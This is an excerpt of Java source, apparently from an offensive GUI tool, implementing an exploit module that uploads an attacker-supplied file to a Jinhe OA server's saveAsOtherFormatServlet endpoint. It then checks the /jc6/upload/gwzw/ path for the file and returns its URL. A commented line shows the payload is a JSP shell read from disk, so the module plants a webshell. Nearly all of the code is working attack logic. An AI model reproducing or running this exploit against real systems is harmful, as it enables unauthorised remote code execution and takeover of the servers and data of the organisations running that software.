...
public class jinhe_saveAsOtherFormatServlet_upload implements Exploitlnterface {
    @Override
    ...
    public static String saveAsOtherFormatServlet(String url,String filename,String content){
        ...
        Response res = HttpTools.post(url+"/jc6/servlet/saveAsOtherFormatServlet?fileName="+filename,postData,head,"utf-8");
        if(res.getCode()==200 && res.getText().contains("OK")){
            Response res1 = HttpTools.get(url+"/jc6/upload/gwzw/"+filename,new HashMap<>(),"utf-8");
            if(res1.getCode()==200&&res1.getText().contains(content.substring(0,2))){
                return url+"/jc6/upload/gwzw/"+filename;
            }
        }
        return null;
    }
...
//            String shell_payload = shell.readFile(shell.Jsppath);
            ...
            String result = saveAsOtherFormatServlet(url,filename,payload);


            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ jinhe_saveAsOtherFormatServlet_upload ]");
